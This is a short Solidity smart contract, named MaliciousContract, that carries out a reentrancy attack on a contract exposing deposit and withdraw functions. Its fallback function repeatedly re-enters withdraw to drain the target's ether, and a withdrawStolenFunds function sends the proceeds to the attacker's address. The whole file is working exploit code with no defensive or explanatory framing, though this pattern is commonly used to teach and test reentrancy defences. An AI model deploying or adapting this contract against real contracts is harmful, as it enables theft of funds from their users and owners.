// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableContract {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
}

contract MaliciousContract {
    IVulnerableContract public vulnerableContract;
    address public owner;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = IVulnerableContract(_vulnerableContractAddress);
        owner = msg.sender;
    }

    // Fallback function to receive Ether and reenter the withdraw function
    fallback() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw(1 ether);
        }
    }

    // Function to start the attack
    function attack() external payable {
        require(msg.value >= 1 ether, "Minimum 1 ether required to attack");

        // Deposit Ether into the vulnerable contract
        vulnerableContract.deposit{value: 1 ether}();

        // Start the reentrancy attack
        vulnerableContract.withdraw(1 ether);
    }

    // Function to withdraw stolen funds
    function withdrawStolenFunds() external {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }
}